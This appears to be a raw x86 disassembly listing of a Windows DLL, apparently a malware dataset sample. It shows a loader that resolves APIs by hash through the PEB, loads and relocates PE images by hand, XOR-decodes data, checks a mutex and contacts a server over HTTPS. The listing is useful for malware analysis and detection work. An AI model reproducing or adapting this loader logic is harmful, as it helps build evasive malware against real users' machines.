cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001e2f
mov edi [ ebp - 0xc ]
add esp 0xc
sub_10001fe7
push ebp
mov ebp esp
sub esp 0x60
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push ebx
push esi
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x60 ]
push eax
call sub_10001c39
pop ecx
pop ecx
push 0xa
pop ecx
mov esi eax
lea edi [ ebp - 0x38 ]
[ edi ] [ esi ]
xor esi esi
push esi
push esi
push [ ebp - 0x30 ]
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
call [ InternetOpenA@IAT ]
push esi
push esi
push 0x3
push esi
push esi
push 0x1bb
push [ ebp - 0x2c ]
mov ebx eax
push ebx
call [ InternetConnectA@IAT ]
push [ ebp - 0x28 ]
mov edi eax
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push esi
push 0x800000
push esi
push esi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001d56
push [ ebp - 0x14 ]
call sub_10002d28
pop ecx
pop ecx
push eax
push [ ebp - 0x14 ]
push 0x0
push 0x0
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x24 ]
call sub_10002d28
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
call sub_100015cd
push [ ebp - 0x8 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
pop ebx
and [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push 0x0
push eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x4
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
cmp [ ebp - 0xc ] 0xc8
mov [ ebp - 0x1 ] 0x34
je r-xdata
push [ ebp - 0x28 ]
call sub_10002d28
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x28 ]
push 0x2b
push edi
call esi
push [ ebp - 0x24 ]
call sub_10002d28
pop ecx
push eax
push [ ebp - 0x24 ]
push 0x2c
push edi
call esi
xor esi esi
mov [ ebp - 0x1 ] 0x32
cmp [ ebp - 0xc ] 0x194
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp - 0x8 ]
call sub_10001eb1
add esp 0xc
sub_10002154
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] edi
je r-xdata
pop ebx
cmp [ ebx + 0xc ] edi
je r-xdata
cmp [ ebx + 0x18 ] edi
je r-xdata
cmp [ ebx + 0x1c ] edi
je r-xdata
cmp [ ebx + 0x24 ] edi
je r-xdata
push esi
push 0x50
call sub_1000295a
push [ ebx ]
mov esi eax
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx ]
test eax eax
mov [ esi ] eax
lea eax [ ebx + 0x4 ]
cmovne ecx edx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
neg eax
sbb eax eax
and eax 0x4
mov [ esi + 0xc ] eax
push [ ebx + 0x8 ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x8 ]
test eax eax
mov [ esi + 0x10 ] eax
cmovne ecx edx
mov [ esi + 0x14 ] ecx
push [ ebx + 0xc ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0xc ]
test eax eax
mov [ esi + 0x18 ] eax
cmovne ecx edx
mov [ esi + 0x1c ] ecx
push [ ebx + 0x10 ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x10 ]
test eax eax
mov [ esi + 0x20 ] eax
cmovne ecx edx
mov [ esi + 0x24 ] ecx
push [ ebx + 0x14 ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x14 ]
test eax eax
mov [ esi + 0x28 ] eax
cmovne ecx edx
mov [ esi + 0x2c ] ecx
push [ ebx + 0x18 ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x18 ]
test eax eax
mov [ esi + 0x30 ] eax
cmovne ecx edx
mov [ esi + 0x34 ] ecx
push [ ebx + 0x1c ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x1c ]
test eax eax
mov [ esi + 0x38 ] eax
cmovne ecx edx
mov [ esi + 0x3c ] ecx
push [ ebx + 0x20 ]
call sub_10002d28
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x20 ]
test eax eax
mov [ esi + 0x40 ] eax
cmovne ecx edx
mov [ esi + 0x44 ] ecx
push [ ebx + 0x24 ]
call sub_10002d28
xor ecx ecx
mov [ ebp - 0x4 ] edi
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x24 ]
test eax eax
mov [ esi + 0x48 ] eax
lea eax [ ebp - 0x4 ]
mov ebx esi
push eax
cmovne ecx edx
push 0xa
push ebx
mov [ esi + 0x4c ] ecx
call sub_10001d91
mov esi eax
add esp 0x34
test esi esi
je r-xdata
push ebx
call sub_10002a8f
pop ecx
pop esi
push [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
call sub_10001eb1
xor ecx ecx
inc ecx
test eax eax
push esi
cmovne edi ecx
call sub_10002a8f
add esp 0x10
sub_100022e7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx edi
mov al [ esi ]
test al al
je r-xdata
cmp ebx [ ebp + 0xc ]
jae r-xdata
pop ebx
cmp [ ebp + 0x10 ] 0x0
mov [ ebp + 0xb ] al
je r-xdata
imul ecx edi 0x19660d
movzx eax al
lea edi [ eax + 0x3c6ef35f ]
add edi ecx
inc ebx
inc esi
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
call sub_10002393
mov al [ ebp + 0xb ]
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1000233b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx edi
movzx eax [ esi ]
test ax ax
je r-xdata
cmp ebx [ ebp + 0xc ]
jae r-xdata
pop ebx
cmp [ ebp + 0x10 ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
imul ecx edi 0x19660d
movzx edi al
add edi 0x3c6ef35f
add edi ecx
inc ebx
add esi 0x2
jmp r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_100023ac
mov eax [ ebp + 0x8 ]
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_100023c7
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx edx
je r-xdata
mov eax ecx
pop ebp
retn
mov ecx edx
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
dec ecx
sub_100023e3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_100023c7
mov dl [ ebp + 0xc ]
pop ecx
lea ecx [ esi - 0x1 ]
add ecx eax
inc ecx
cmp [ ecx ] dl
cmove edi ecx
cmp ecx esi
jae r-xdata
mov al [ ecx ]
dec ecx
cmp al dl
je r-xdata
sub_1000241c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx edx
je r-xdata
mov eax ecx
pop ebp
retn
jmp r-xdata
mov al [ edx ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
imul ecx ecx 0xa
movsx eax al
add ecx 0xffffffd0
add ecx eax
inc edx
sub_10002444
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
pop ebx
mov eax [ fs : 0x30 ]
push esi
mov eax [ eax + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov esi [ eax ]
pop esi
push [ ebp + 0x10 ]
movzx eax [ esi + 0x2c ]
push eax
push [ esi + 0x30 ]
call sub_1000233b
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
xor edi edi
mov [ esi + 0x18 ] ebx
inc edi
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp esi eax
je r-xdata
sub_1000249c
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
pop ebp
retn
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] eax
sete bl
push ebx
push eax
push [ ebp + 0x8 ]
call sub_100022e7
push ebx
push [ ebp + 0xc ]
push eax
call sub_10002444
add esp 0x18
pop ebx
sub_100024c9
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test ecx ecx
mov edx sub_100024c9
cmove ecx edx
and ecx 0xffff0000
sub ecx 0x1000
test eax eax
je r-xdata
mov edx [ ecx + 0x3c ]
cmp edx 0x300
jae r-xdata
mov edx 0x5a4d
cmp [ ecx ] dx
jne r-xdata
pop ebp
retn
cmp [ edx + ecx ] 0x4550
cmove eax ecx
sub_1000250c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xcdcb4e50
push edi
test esi esi
je r-xdata
xor edi edi
inc edi
push edi
push ebx
call sub_10002592
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push ebx
call sub_10002753
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx 0x70297938
test esi esi
je r-xdata
push edi
push ebx
call sub_10002592
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
push edi
push ebx
call sub_10002753
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx 0x723f0158
test esi esi
je r-xdata
push edi
push ebx
call sub_10002592
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
push edi
push ebx
call sub_10002753
pop ecx
pop ecx
test eax eax
jne r-xdata
test esi esi
je r-xdata
and [ esi ] eax
sub_10002592
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
and [ ebp - 0x4 ] esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100027ac
mov edx [ ebp - 0x4 ]
add esp 0xc
mov ebx eax
xor ecx ecx
mov [ ebp - 0xc ] ebx
test edx edx
je r-xdata
push ebx
call sub_10002a8f
pop ecx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x8 ]
mov ebx eax
mov [ ebp - 0x8 ] eax
push edi
mov edi ebx
mov ebx [ ebp - 0xc ]
pop edi
and [ ebp - 0x4 ] esi
mov eax ebx
mov ebx [ edi ]
mov ebx [ ebp - 0x8 ]
add edi 0x10
inc ecx
cmp ecx edx
jb r-xdata
cmp ebx [ eax + 0x4 ]
jne r-xdata
test esi esi
jne r-xdata
add eax 0x10
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
sub_10002609
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
mov eax [ fs : 0x30 ]
test eax eax
je r-xdata
push ebx
mov ebx [ eax + 0xc ]
add ebx 0xc
push esi
mov esi [ ebx ]
pop esi
pop ebx
movzx eax [ esi + 0x2c ]
xor ecx ecx
cmp [ ebp + 0x10 ] eax
ja r-xdata
cmp ecx [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ esi + 0x30 ]
call sub_1000233b
add esp 0xc
mov ecx eax
mov esi [ esi ]
mov edi [ esi + 0x18 ]
jmp r-xdata
cmp esi ebx
je r-xdata
test edi edi
je r-xdata
sub_10002661
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax 0x5a4d
cmp [ edi ] ax
jne r-xdata
mov ecx [ edi + 0x3c ]
cmp [ ecx + edi ] 0x4550
jne r-xdata
mov eax [ ecx + edi + 0x78 ]
mov ecx [ ecx + edi + 0x7c ]
mov [ ebp - 0x14 ] ecx
push ebx
lea ecx [ eax + edi ]
or ebx 0xffffffff
mov eax edx
mov [ ebp - 0x10 ] ecx
shr eax 0x10
test ax ax
jne r-xdata
mov eax [ ecx + 0x24 ]
mov edx [ ecx + 0x20 ]
add eax edi
add edx edi
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x18 ]
mov [ ebp + 0x8 ] edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
movzx ebx dx
sub ebx [ ecx + 0x10 ]
jmp r-xdata
pop ebx
mov esi [ ebp - 0x8 ]
test ebx ebx
js r-xdata
mov ecx [ ebp - 0x10 ]
xor esi esi
push [ ebp + 0x10 ]
mov eax [ edx ]
push [ ebp + 0x14 ]
add eax edi
push eax
call sub_100022e7
mov edx [ ebp + 0x8 ]
add esp 0xc
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x1c ]
lea eax [ eax + ebx * 4 ]
mov esi [ eax + edi ]
add esi edi
cmp esi ecx
jbe r-xdata
add edx 0x4
add esi 0x2
mov [ ebp + 0x8 ] edx
movzx ebx [ esi ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax ecx
cmp esi eax
jae r-xdata
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
push esi
call sub_1000286a
pop ecx
mov esi eax
sub_10002753
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0x5
call sub_100028d5
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
push esi
mov esi edi
push edi
call sub_10002a8f
pop ecx
pop esi
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_1000233b
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
add esi [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov ebx [ esi + 0x44 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
sub_100027ac
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
and [ edi ] esi
push ebx
push 0x5
call sub_100028d5
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop ebx
cmp [ ebx ] 0x0
mov esi ebx
je r-xdata
mov eax [ edi ]
shl eax 0x4
push eax
call sub_1000295a
cmp [ ebx ] 0x0
mov esi ebx
pop ecx
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
call sub_10002a8f
mov esi [ ebp + 0x10 ]
pop ecx
lea edi [ eax + 0xc ]
inc [ edi ]
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_1000233b
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ esi + 0x38 ]
mov [ edi - 0xc ] eax
mov eax [ esi + 0x3c ]
mov [ edi - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ edi - 0x4 ] eax
mov eax [ esi + 0x48 ]
mov [ edi ] eax
add edi 0x10
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_1000233b
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
add esi [ esi ]
cmp [ esi ] 0x0
jne r-xdata
add esi [ esi ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
sub_1000286a
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop ebx
pop ebp
retn
push esi
push 0x2e
push ebx
call sub_100023e3
pop ecx
pop ecx
mov esi eax
sub eax ebx
push eax
push 0x1
push 0x1
push eax
push ebx
call sub_100022e7
add esp 0xc
push eax
call sub_10002609
add esp 0xc
mov ebx eax
inc esi
cmp [ esi ] 0x23
jne r-xdata
push 0x1
push edi
push esi
call sub_100022e7
add esp 0xc
lea eax [ esi + 0x1 ]
push eax
call sub_1000241c
pop ecx
jmp r-xdata
push edi
push 0x1
push eax
push ebx
call sub_10002661
add esp 0x10
mov edi eax
pop esi
sub_100028d5
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
push esi
push 0x1
push 0xa4137e37
call sub_10002609
add esp 0xc
test eax eax
je r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push esi
push 0x1
push 0xa2ea8afa
push eax
call sub_10002661
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
pop ebx
push edi
mov edi 0x8000
push esi
call sub_10002aad
pop ecx
call sub_1000295a
jmp r-xdata
xor edi edi
add edi edi
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
push [ ebp + 0x8 ]
call ebx
cmp eax 0xc0000004
jne r-xdata
push edi
test esi esi
jne r-xdata
pop edi
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_10002a8f
pop ecx
xor esi esi
sub_10002971
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
mov ecx ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
shr ecx 0x2
mov [ ebp + 0x8 ] edi
mov eax edi
test ecx ecx
je r-xdata
and ebx 0x3
jbe r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub esi edx
mov edi [ esi ]
cmp [ edx ] edi
mov ebx [ ebp + 0x10 ]
push eax
pop edi
je r-xdata
mov cl [ edx ]
mov ch [ esi + edx ]
cmp cl ch
je r-xdata
add edx 0x4
add esi 0x4
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] ecx
jb r-xdata
mov eax [ edx ]
sub eax [ esi ]
and [ ebp + 0xc ] 0x0
cmp [ ebp + 0xc ] eax
sbb eax eax
and eax 0x2
dec eax
inc edx
inc edi
cmp edi ebx
jb r-xdata
movzx eax ch
movzx ecx cl
sub ecx eax
mov [ ebp + 0x10 ] 0x1
or eax 0xffffffff
test ecx ecx
cmovg eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
sub_100029f9
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
push ebx
cmp edi esi
jbe r-xdata
mov ecx edx
mov ebx edi
shr ecx 0x2
test ecx ecx
je r-xdata
lea eax [ esi + edx ]
cmp edi eax
ja r-xdata
push 0x0
pop eax
and edx 0x3
jbe r-xdata
mov eax [ esi ]
add esi 0x4
mov [ ebx ] eax
add ebx 0x4
sub ecx 0x1
jne r-xdata
mov ebx edx
lea ecx [ edi - 0x4 ]
shr ebx 0x2
lea esi [ esi + ebx * 4 ]
add esi 0xfffffffc
lea ecx [ ecx + ebx * 4 ]
test ebx ebx
je r-xdata
pop ebx
mov cl [ eax + esi ]
mov [ eax + ebx ] cl
inc eax
cmp eax edx
jb r-xdata
and edx 0x3
jbe r-xdata
mov eax [ esi ]
sub esi 0x4
mov [ ecx ] eax
sub ecx 0x4
sub ebx 0x1
jne r-xdata
sub esi ecx
mov al [ esi + ecx ]
mov [ ecx ] al
dec ecx
sub edx 0x1
jne r-xdata
jmp r-xdata
sub_10002aad
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call sub_1000295a
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp + 0xc ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
pop ebp
retn
push eax
call sub_10002a8f
xor eax eax
jmp r-xdata
pop ecx
pop ebp
retn
sub_10002ae7
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] esi
je r-xdata
push [ ebp + 0xc ]
call sub_1000295a
push [ ebp + 0xc ]
mov esi eax
push [ ebp + 0x8 ]
push esi
call sub_100029f9
add esp 0x10
sub_10002b15
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
xor edi edi
push edi
push 0x1
push 0x98853a78
call sub_10002609
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push edi
push 0x1
push 0x3b66d24c
push esi
call sub_10002661
push edi
push 0x1
mov ebx eax
push 0x79f5d836
push esi
mov [ ebp - 0xc ] ebx
call sub_10002661
add esp 0x20
mov [ ebp - 0x18 ] eax
test ebx ebx
je r-xdata
pop ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov eax 0x5a4d
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebx + 0x3c ]
cmp [ eax + ebx ] 0x4550
jne r-xdata
mov ecx [ eax + ebx + 0x80 ]
xor edx edx
mov eax [ eax + ebx + 0x84 ]
add ecx ebx
push 0x14
pop esi
div esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] edi
test eax eax
je r-xdata
xor edi edi
inc edi
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
lea esi [ ecx + ebx ]
push esi
call [ ebp - 0x18 ]
push edi
push eax
push esi
mov [ ebp - 0x8 ] eax
call sub_1000249c
mov ecx [ ebp - 0x4 ]
add esp 0xc
mov esi [ ecx + 0x10 ]
mov eax [ ecx ]
add esi ebx
add eax ebx
mov [ ebp - 0x10 ] eax
cmp [ esi ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
add ecx 0x14
inc eax
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] eax
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
js r-xdata
movzx eax ax
add eax 0x2
add eax ebx
jmp r-xdata
push eax
push [ ebp - 0x8 ]
call [ ebp - 0xc ]
mov [ esi ] eax
add esi 0x4
mov eax [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x10 ] eax
cmp [ esi ] edi
jne r-xdata
sub_10002c39
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
pop ebx
mov ecx 0x5a4d
cmp [ esi ] cx
jne r-xdata
mov edx [ esi + 0x3c ]
add edx esi
mov [ ebp - 0xc ] edx
cmp [ edx ] 0x4550
jne r-xdata
mov eax ebx
sub eax [ edx + 0x34 ]
mov [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
inc eax
mov eax [ edx + 0xa4 ]
push edi
mov edi [ edx + 0xa0 ]
add edi esi
add eax edi
mov [ ebp - 0x8 ] eax
cmp edi eax
jae r-xdata
mov [ edx + 0x34 ] ebx
pop edi
mov ebx [ ebp + 0x8 ]
add edi [ eax ]
cmp edi [ ebp - 0x8 ]
jb r-xdata
movzx eax [ edx ]
mov [ ebp + 0xa ] ax
shr [ ebp + 0xa ] 0xc
cmp [ ebp + 0xa ] 0x3
je r-xdata
lea eax [ edi + 0x4 ]
mov ecx [ eax ]
lea edx [ edi + 0x8 ]
sub ecx 0x8
mov [ ebp - 0x4 ] eax
shr ecx 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
and eax 0xfff
add eax [ edi ]
add [ eax + esi ] ebx
cmp [ ebp + 0xa ] 0xa
jne r-xdata
mov eax [ ebp - 0x4 ]
add edx 0x2
sub ecx 0x1
jne r-xdata
sub_10002cf7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
call sub_1000250c
pop ecx
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push eax
call sub_10002db7
pop ecx
mov esi eax
sub_10002d31
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
pop edi
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx esi
jbe r-xdata
pop ebx
xor esi esi
xor edx edx
mov eax esi
div [ ebp + 0x14 ]
mov cl [ edx + edi ]
xor [ ebx ] cl
inc ebx
inc esi
cmp esi [ ebp + 0xc ]
jb r-xdata
mov esi [ ebp + 0x8 ]
sub_10002d6c
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push esi
push 0x1
push 0xa4137e37
call sub_10002609
add esp 0xc
test eax eax
je r-xdata
push esi
push 0x1
push 0x99885504
push eax
call sub_10002661
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
mov esi eax
neg esi
sbb esi esi
inc esi
sub_10002db7
push ebp
mov ebp esp
sub esp 0x24
push esi
xor esi esi
push esi
push 0x1
push 0xa4137e37
mov [ ebp - 0x4 ] esi
call sub_10002609
add esp 0xc
test eax eax
je r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
push esi
push 0x1
push 0x46264019
push eax
call sub_10002661
mov ecx eax
add esp 0x10
test ecx ecx
je r-xdata
mov esi [ ebp - 0x4 ]
push edi
xor eax eax
mov [ ebp - 0x24 ] 0x18
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x8 ] esi
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push 0x43a
lea eax [ ebp - 0x4 ]
push eax
call ecx
mov esi [ ebp - 0x4 ]
xor ecx ecx
test eax eax
pop edi
cmovne esi ecx
jmp r-xdata
sub_10002e33
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_10002e90
pop ecx
test al al
je r-xdata
push 0x23
call sub_10003f04
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx esi
call sub_10005d0a
mov ecx eax
call sub_10004758
mov esi eax
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10002e90
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x15
push r--data
call sub_100030d1
pop ecx
pop ecx
mov esi eax
push esi
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov edi eax
call [ GetLastError@IAT ]
push esi
mov ebx eax
call j_sub_10003f1b
pop ecx
test edi edi
je r-xdata
mov al 0x1
cmp ebx 0xb7
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10002ede
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
xor esi esi
push esi
push esi
push edi
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptStringToBinaryA@IAT ]
cmp [ edi ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
push [ edi ]
call sub_10003f3c
pop ecx
push 0x0
push 0x0
push edi
mov esi eax
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptStringToBinaryA@IAT ]
sub_10002f22
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push ebx
push esi
push eax
push 0x0
mov ebx 0x40000001
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
